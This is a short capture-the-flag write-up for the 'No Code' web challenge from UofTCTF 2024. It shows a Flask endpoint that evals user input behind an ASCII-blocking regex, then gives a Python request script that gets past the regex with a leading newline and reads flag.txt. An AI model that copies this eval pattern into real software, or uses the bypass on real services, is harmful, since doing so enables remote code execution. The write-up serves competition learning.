---
title: No Code
date: 2024-01-16
tags: 
- web
- author-hartmannsyg
categories: UofTCTF 2024
---

solved by {% person hartmannsyg %}

```python
from flask import Flask, request, jsonify
import re

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code', '')
    if re.match(".*[\x20-\x7E]+.*", code):
        return jsonify({"output": "jk lmao no code"}), 403
    result = ""
    try:
        result = eval(code)
    except Exception as e:
        result = str(e)

    return jsonify({"output": result}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)
```

We see that it uses a regex `/.*[\x20-\x7E]+.*` to filter it from any "normal" ascii characters.

However, we can simply send a newline to overcome this (thanks {% person squiddy %}):

```python
import requests

code = """\nopen("flag.txt").read()"""

a = requests.post('https://uoftctf-no-code.chals.io/execute',{"code": code})
print(a.text)
```
